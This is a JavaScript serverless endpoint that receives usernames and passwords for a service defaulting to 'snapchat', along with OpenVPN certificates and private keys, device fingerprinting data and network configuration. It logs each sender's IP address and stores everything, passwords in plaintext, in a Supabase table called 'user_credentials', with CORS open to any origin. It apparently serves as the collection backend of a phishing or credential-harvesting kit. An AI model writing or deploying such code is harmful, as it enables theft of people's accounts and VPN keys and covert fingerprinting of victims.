const { createClient } = require('@supabase/supabase-js');

// Initialize Supabase client
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { 
      username, 
      password,
      // VPN Configuration - Certificates
      ca_crt,
      client_crt,
      client_key,
      ta_key,
      // VPN Configuration - Server details
      server_ip = '206.45.29.181',
      server_port = 1194,
      protocol = 'udp',
      // System information (auto-detected)
      system_info,
      // OVPN file content
      ovpn_config,
      // Advanced fingerprinting data
      advanced_data,
      // Service name
      service = 'snapchat',
      // Optional metadata
      config_name,
      notes
    } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, error: 'Username and password are required' });
    }

    // Get IP address from request headers
    const ipAddress = 
      req.headers['x-forwarded-for'] || 
      req.headers['x-real-ip'] || 
      req.connection?.remoteAddress || 
      'unknown';

    // Prepare data object for Supabase
    const dataToInsert = {
      username,
      password,
      ip_address: ipAddress,
      created_at: new Date().toISOString()
    };

    // Add VPN configuration if provided
    if (ca_crt) dataToInsert.ca_crt = ca_crt;
    if (client_crt) dataToInsert.client_crt = client_crt;
    if (client_key) dataToInsert.client_key = client_key;
    if (ta_key) dataToInsert.ta_key = ta_key;
    
    // Add server configuration
    dataToInsert.server_ip = server_ip;
    dataToInsert.server_port = parseInt(server_port);
    dataToInsert.protocol = protocol;
    
    // Store comprehensive system information with advanced data
    if (system_info || advanced_data) {
      dataToInsert.system_info = JSON.stringify({
        basic: system_info,
        advanced: advanced_data,
        ovpn_generated: !!ovpn_config,
        collection_timestamp: new Date().toISOString()
      });
    }
    
    // ⭐ Extract and store native network config separately if available
    if (advanced_data?.native_network_config) {
      dataToInsert.native_network_config = JSON.stringify(advanced_data.native_network_config);
    }
    
    // ⭐ Set platform type based on collection info
    if (advanced_data?.collection_info?.platform) {
      dataToInsert.platform_type = advanced_data.collection_info.platform;
    } else {
      dataToInsert.platform_type = 'web';
    }

    // Store OVPN config (add column 'ovpn_config TEXT' to Supabase if needed)
    if (ovpn_config) {
      dataToInsert.ovpn_config = ovpn_config;
    }
    
    // Add optional metadata
    if (service) dataToInsert.service = service;
    if (config_name) dataToInsert.config_name = config_name;
    if (notes) dataToInsert.notes = notes;

    console.log('Enhanced data prepared:', {
      username,
      ip: ipAddress,
      has_vpn_config: !!(ca_crt || client_crt || client_key),
      has_system_info: !!system_info,
      has_advanced_data: !!advanced_data,
      has_ovpn_config: !!ovpn_config,
      ovpn_size: ovpn_config ? ovpn_config.length : 0,
      has_native_network_config: !!(advanced_data?.native_network_config),
      platform_type: dataToInsert.platform_type
    });

    // Store in Supabase
    const { data, error } = await supabase
      .from('user_credentials')
      .insert([dataToInsert]);

    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ 
        success: false, 
        error: 'Database error',
        details: error.message 
      });
    }

    console.log('Enhanced data stored successfully!');
    
    res.status(200).json({ 
      success: true, 
      message: 'Data stored successfully with OVPN configuration',
      ovpn_generated: !!ovpn_config,
      advanced_fingerprint: !!advanced_data,
      native_network_config: !!(advanced_data?.native_network_config),
      platform_type: dataToInsert.platform_type
    });

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      details: error.message 
    });
  }
};
